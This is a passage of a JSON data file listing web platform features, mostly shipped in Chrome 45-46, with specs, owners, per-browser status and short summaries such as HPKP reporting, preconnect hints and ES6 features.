    "summary": "DPR, Width, and Viewport-Width hints enable proactive content negotiation between client and server, enabling automated delivery of optimized assets - e.g. auto-negotiating image DPR resolution, image size, and other optimized assets based on signals such as client's viewport width. \r\n\r\nFor more detail, see: https://docs.google.com/document/d/1SnRhnR_oWQ4Rivb7InJ9a_0T2k9CnuhNcMkd9xtLrKY/edit and https://github.com/igrigorik/http-client-hints#use-cases",
    "id": 5504430086553600,
    "resources": {
      "docs": [
        "https://github.com/igrigorik/http-client-hints",
        "https://developers.google.com/web/updates/2015/09/automating-resource-selection-with-client-hints",
        "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers",
        "https://developer.mozilla.org/en-US/docs/Web/HTTP/Content_negotiation"
      ],
      "samples": [
        "https://github.com/igrigorik/http-client-hints#use-cases"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:29.060990",
      "by": "ericbidelman@google.com"
    },
    "name": "HTTP Public Key Pinning violating reporting",
    "tags": [
      "HPKP",
      "Public Key Pinning"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://tools.ietf.org/html/rfc7469",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "estark@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 46,
        "flag": false,
        "bug": "https://crbug.com/445793",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "HTTP Public Key Pinning (HPKP) allows websites to send an HTTP header that pins one or more of the public keys present in the site’s certificate chain. This feature tracks the implementation of HPKP reporting, which allows website owners to receive reports when the browser detects HPKP violations.",
    "id": 4669935557017600,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2015/09/HPKP-reporting-with-chrome-46",
        "https://docs.google.com/document/d/1hPMeG44li9hccIj4Jm2S3v1O_DEYnPsoiD4ZCzkAN8c/edit?usp=sharing",
        "https://developer.mozilla.org/en-US/docs/Web/Security/Public_Key_Pinning"
      ]
    }
  },
  {
    "category": "Network / Connectivity",
    "updated": {
      "when": "2017-11-07 18:00:09.616880",
      "by": "ericbidelman@google.com"
    },
    "name": "Link rel=preconnect (Resource Hints)",
    "tags": [
      "preconnect"
    ],
    "comments": "There is some leeway on the actual preconnect and it is treated as a hint.  In particular, the number of connections is left to the browser to decide.\r\n\r\nIn cases where Chrome already has predictor information we may choose to ignore the preconnect hint entirely and use the historical knowledge we have from the predictor.",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://w3c.github.io/resource-hints/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1135160",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "pmeenan@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 46,
        "ios": 46,
        "blink_components": [
          "Blink>Network"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://crbug.com/449620",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "url": "https://groups.google.com/a/chromium.org/d/msg/loading-dev/K41mJ0Phs8A/0s_rH40Nnj0J",
          "text": "Public support",
          "val": 3
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "Adds support for <link rel=\"preconnect\" href=\"...\"> (and the equivalent HTTP link header) as a hint that the browser should predictively open a connection to the supplied server/protocol for resources that will be needed later in the loading process.",
    "id": 5560623895150592,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/HTML/Element/link"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:47.301710",
      "by": "ericbidelman@google.com"
    },
    "name": "Parsing background_color from Web Application Manifest",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/manifest/#background_color-member",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "lalitm@google.com",
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=522042",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The background_color attribute in the JSON Web Application Manifest allows web developers to provide a hint to Chrome indicating the background color of their web application. This color is used as the background of the application while its resources are fetched.",
    "id": 5651543017652224,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2015/09/using-web-app-manifest-to-set-solid-color-loading-screen",
        "https://developer.mozilla.org/en-US/docs/Web/Manifest"
      ]
    }
  },
  {
    "category": "Misc",
    "updated": {
      "when": "2017-06-14 18:28:56.664470",
      "by": "ericbidelman@google.com"
    },
    "name": "Parsing theme_color from Web Application Manifest",
    "tags": [
      "theme_color",
      "manifest"
    ],
    "comments": "It should be noted that if a theme color is specified as a meta-tag for a certain page (see https://developers.google.com/web/updates/2014/11/Support-for-theme-color-in-Chrome-39-for-Android?hl=en), then the information from the meta tag will override the global theme color option in the manifest for that page.",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/manifest/#theme_color-member",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1164235",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "lalitm@google.com",
          "mlamouri@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=510402",
        "intervention": false
      },
      "opera": {},
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "The theme_color attribute in the JSON Web Application Manifest allows web developers to provide a global theme color which can be used throughout their entire website. This color is used for the header in the recents menu of Android.",
    "id": 5709006190411776,
    "resources": {
      "docs": [
        "https://developers.google.com/web/updates/2015/09/using-manifest-to-set-sitewide-theme-color",
        "https://developer.mozilla.org/en-US/docs/Web/Manifest"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2018-04-26 07:29:43.195580",
      "by": "Patket@microsoft.com"
    },
    "name": "Performance Timeline APIs for Workers",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/performance-timeline/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "ksakamoto@chromium.org",
          "igrigorik@chromium.org",
          "kenjibaheux@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 46,
        "blink_components": [
          "Blink"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=465638",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Performance Timeline APIs (User Timing and Resource Timing) are now available to Web Workers.",
    "id": 6337483654561792,
    "resources": {
      "docs": [
        "http://www.w3.org/TR/user-timing/",
        "https://w3c.github.io/resource-timing/"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2018-04-26 07:24:57.231550",
      "by": "Patket@microsoft.com"
    },
    "name": "PerformanceResourceTiming.workerStart",
    "tags": [
      "Resource Timing",
      "Service Worker"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://w3c.github.io/resource-timing/#widl-PerformanceResourceTiming-workerStart",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "ksakamoto@chromium.org",
          "igrigorik@chromium.org",
          "kenjibaheux@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 46,
        "blink_components": [
          "Blink"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=465640",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "PerformanceResourceTiming.workerStart attribute allows developers to instrument and measure ServiceWorker startup time.",
    "id": 5767679470206976,
    "resources": {}
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-04-26 07:24:16.128780",
      "by": "Patket@microsoft.com"
    },
    "name": "Service Worker: Allow CORS responses for client requests",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://fetch.spec.whatwg.org/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1184967",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "horo@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 46,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=516972",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "When a FetchEvent is for page loading or worker script loading, FetchEvent.respondWith() will accept CORS responses.",
    "id": 5686195350667264,
    "resources": {
      "docs": [
        "https://github.com/whatwg/fetch/commit/1612905aae06fdb912779b308d71bfc13422833f"
      ]
    }
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-04-26 07:23:49.715740",
      "by": "Patket@microsoft.com"
    },
    "name": "Service Worker: ServiceWorkerRegistration.update() returns a promise",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://slightlyoff.github.io/ServiceWorker/spec/service_worker/index.html",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1187350",
          "text": "In development",
          "val": 2
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "jungkee.song@samsung.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=513655",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "update() pings the server for an updated version of this Service Worker registration. This feature was shipped in milestone 45.\r\n\r\nIn milestone 46, update() returns a promise that resolves with 'undefined' if the operation completed successfully or there was no update, and rejects if update failed. If the new worker ran but installation failed, the promise still resolves (same with register()).",
    "id": 5631681746698240,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerRegistration/update"
      ]
    }
  },
  {
    "category": "Service Worker",
    "updated": {
      "when": "2018-03-28 21:28:22.006580",
      "by": "ericbidelman@google.com"
    },
    "name": "Service worker: Clients.matchAll() returns clients in MRU order",
    "tags": [
      "service",
      "worker",
      "serviceworker",
      "clients",
      "matchall",
      "mru"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "https://slightlyoff.github.io/ServiceWorker/spec/service_worker/#clients-matchall-method",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "falken@chromium.org",
          "jeremyarcher@google.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "blink_components": [
          "Blink>ServiceWorker"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=461411",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Clients.matchAll sorts the clients in most-recently-focused order.",
    "id": 4716607557337088,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Clients/matchAll"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:29:09.666530",
      "by": "ericbidelman@google.com"
    },
    "name": "Spread (call and array) (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/36",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "adamk@chromium.org",
          "caitpotter88@gmail.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 46,
        "blink_components": [
          "Blink"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://code.google.com/p/v8/issues/detail?id=3018",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/spreades6?term=spread",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Strongly positive",
          "val": 1
        }
      }
    },
    "summary": "Spread calls allow an iterable expression to be spread into function arguments, similar to using Function.prototype.apply.\r\n\r\nSpread array allows an array literal to contain spread expressions which spreads the values of the iterator into the array.",
    "id": 6031334694715392,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_operator"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/spread-operator/index.html"
      ]
    }
  },
  {
    "category": "Performance",
    "updated": {
      "when": "2017-06-14 18:28:56.940910",
      "by": "ericbidelman@google.com"
    },
    "name": "Unprefixed Resource Timing API",
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://w3c.github.io/resource-timing/#extensions-performance-interface",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://groups.google.com/forum/#!msg/mozilla.dev.platform/p5mAyZCKGHk/Qj5YjaTnBj8J",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "ksakamoto@chromium.org",
          "igrigorik@chromium.org",
          "kenjibaheux@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 46,
        "blink_components": [
          "Blink"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=515344",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Resource Timing extensions to the Performance interface without the \"webkit\" prefix.",
    "id": 5710624386449408,
    "resources": {
      "docs": [
        "http://googledevelopers.blogspot.com/2013/12/measuring-network-performance-with.html"
      ]
    }
  },
  {
    "category": "Multimedia",
    "updated": {
      "when": "2017-06-14 18:29:17.176070",
      "by": "ericbidelman@google.com"
    },
    "name": "WebAudio: Allow disabling normalization in PeriodicWave",
    "comments": "",
    "standards": {
      "status": {
        "text": "Editor's draft",
        "val": 4
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://webaudio.github.io/web-audio-api/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "rtoy@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 46,
        "ios": 46,
        "blink_components": [
          "Blink"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "http://crbug.com/499919",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "createPeriodicWave() takes an optional third parameter that allows enabling or disabling normalization of the waveform that would be produced by a PeriodicWave.  The default is to enable normalization, which was the previous behavior.",
    "id": 6672329572614144,
    "resources": {
      "docs": [
        "https://github.com/WebAudio/web-audio-api/issues/91#issuecomment-60655020"
      ]
    }
  },
  {
    "category": "Realtime / Communication",
    "updated": {
      "when": "2018-02-14 21:59:15.682950",
      "by": "jmedley@google.com"
    },
    "name": "WebRTC Data Channel buffer monitoring with the \"bufferedamountlow\" event",
    "tags": [
      "datachannel",
      "sctp",
      "backpressure"
    ],
    "comments": "",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 4
      },
      "spec": "http://w3c.github.io/webrtc-pc/",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://lists.w3.org/Archives/Public/public-webrtc/2015May/0097.html",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "bemasc@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 46,
        "blink_components": [
          "Blink"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=496700",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "This event allows pages to use WebRTC DataChannels for high-throughput applications more efficiently and conveniently, by removing the need to use timer-based polling for output buffer management.",
    "id": 5515010235170816,
    "resources": {
      "docs": [
        "https://github.com/w3c/webrtc-pc/pull/233",
        "https://lists.w3.org/Archives/Public/public-webrtc/2015May/thread.html#msg73",
        "https://developer.mozilla.org/en-US/docs/Web/API/RTCDataChannel/onbufferedamountlow"
      ],
      "samples": [
        "https://github.com/webrtc/samples/blob/gh-pages/src/content/datachannel/datatransfer/js/main.js#L127",
        "https://webrtc.github.io/samples/src/content/datachannel/datatransfer/"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2018-04-26 07:20:01.113120",
      "by": "Patket@microsoft.com"
    },
    "name": "new.target (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 5
      },
      "spec": "http://www.ecma-international.org/ecma-262/6.0/#sec-meta-properties-runtime-semantics-evaluation",
      "visibility": {
        "text": "Only a very small number of web developers will care about",
        "val": 4
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=new.target",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 46
        },
        "owners": [
          "adamk@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 46,
        "blink_components": [
          "Blink"
        ],
        "desktop": 46,
        "flag": false,
        "android": 46,
        "bug": "https://code.google.com/p/v8/issues/detail?id=3887",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "url": "https://github.com/Microsoft/ChakraCore/blob/9229c3387b695b2e2fb247681b26d6e6514bc6d1/test/es6/ES6NewTarget.js",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "https://webkit.org/status/#feature-new.target",
          "text": "Shipped",
          "val": 1
        }
      },
      "webdev": {
        "view": {
          "text": "Positive",
          "val": 2
        }
      }
    },
    "summary": "new.target is a \"meta-property\" available in all functions. It refers to the constructor invoked by 'new' (if a construct call is underway) or undefined otherwise.",
    "id": 5210159227863040,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/new.target"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/new-target-es6/index.html"
      ]
    }
  },
  {
    "category": "JavaScript",
    "updated": {
      "when": "2017-06-14 18:28:35.033770",
      "by": "ericbidelman@google.com"
    },
    "first_of_milestone": true,
    "name": "Arrow functions (ES6)",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://people.mozilla.org/~jorendorff/es6-draft.html#sec-arrow-function-definitions",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://developer.mozilla.org/en-US/Firefox/Releases/22#JavaScript",
          "text": "Shipped",
          "val": 1
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "rossberg@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 45,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://code.google.com/p/v8/issues/detail?id=2700",
        "intervention": false
      },
      "opera": {
        "android": 33,
        "desktop": 33
      },
      "edge": {
        "view": {
          "url": "https://status.modern.ie/arrowfunction",
          "text": "Shipped",
          "val": 1
        }
      },
      "safari": {
        "view": {
          "url": "http://trac.webkit.org/changeset/185989",
          "text": "In development",
          "val": 2
        }
      },
      "webdev": {
        "view": {
          "text": "Mixed signals",
          "val": 3
        }
      }
    },
    "summary": "The arrow (=>) takes the place of the function keyword",
    "id": 5047308127305728,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions"
      ],
      "samples": [
        "https://googlechrome.github.io/samples/arrows-es6/index.html"
      ]
    }
  },
  {
    "category": "DOM",
    "updated": {
      "when": "2017-06-14 18:28:53.594680",
      "by": "ericbidelman@google.com"
    },
    "name": "Attr child nodes",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 3
      },
      "spec": "https://dom.spec.whatwg.org/#interface-attr",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Removed",
          "val": 7,
          "milestone_str": 45
        },
        "owners": [
          "philipj@opera.com"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 45,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://code.google.com/p/chromium/issues/detail?id=305105",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "Attr should not have any child nodes per the DOM spec and should not inherit from Node. This entry covers the child node aspect only.",
    "id": 5688366657961984,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/API/Attr"
      ]
    }
  },
  {
    "category": "Security",
    "updated": {
      "when": "2017-06-14 18:28:32.550050",
      "by": "ericbidelman@google.com"
    },
    "name": "CSP2: Exclude 'blob:' and 'filesystem:' from the 'self' source expression.",
    "comments": "",
    "standards": {
      "status": {
        "text": "Established standard",
        "val": 2
      },
      "footprint": {
        "val": 2
      },
      "spec": "https://w3c.github.io/webappsec/specs/content-security-policy/#source-list-guid-matching",
      "visibility": {
        "text": "Will this feature generate articles on sites like html5rocks.com",
        "val": 2
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1150957",
          "text": "Public support",
          "val": 3
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "mkwst@chromium.org"
        ],
        "prefixed": false,
        "origintrial": false,
        "webview": 45,
        "blink_components": [
          "Blink"
        ],
        "desktop": 45,
        "flag": false,
        "android": 45,
        "bug": "https://crbug.com/473904",
        "intervention": false
      },
      "opera": {
        "android": 32,
        "desktop": 32
      },
      "edge": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "safari": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "webdev": {
        "view": {
          "text": "No signals",
          "val": 4
        }
      }
    },
    "summary": "In CSP2, the `'self'` source expression explicitly excludes `blob:` and `filesystem:`. This means that developers will need to add those schemes explicitly to their directives if they wish to include content at those URLs.",
    "id": 4876241895161856,
    "resources": {
      "docs": [
        "https://developer.mozilla.org/en-US/docs/Web/Security/CSP/CSP_policy_directives"
      ]
    }
  },
  {
    "category": "CSS",
    "updated": {
      "when": "2017-06-14 18:29:11.561390",
      "by": "ericbidelman@google.com"
    },
    "name": "CSS Motion Path",
    "tags": [
      "motion path"
    ],
    "comments": "Positive reception from CSS working group\r\nhttp://lists.w3.org/Archives/Public/www-style/2014Oct/0261.html\r\n",
    "standards": {
      "status": {
        "text": "Working draft or equivalent",
        "val": 3
      },
      "footprint": {
        "val": 2
      },
      "spec": "http://dev.w3.org/fxtf/motion-1/",
      "visibility": {
        "text": "Covered as part of a larger article but not on its own",
        "val": 3
      }
    },
    "browsers": {
      "ff": {
        "view": {
          "text": "No public signals",
          "val": 5
        }
      },
      "chrome": {
        "status": {
          "text": "Enabled by default",
          "val": 5,
          "milestone_str": 45
        },
        "owners": [
          "ericwilligers@chromium.org"
        ],
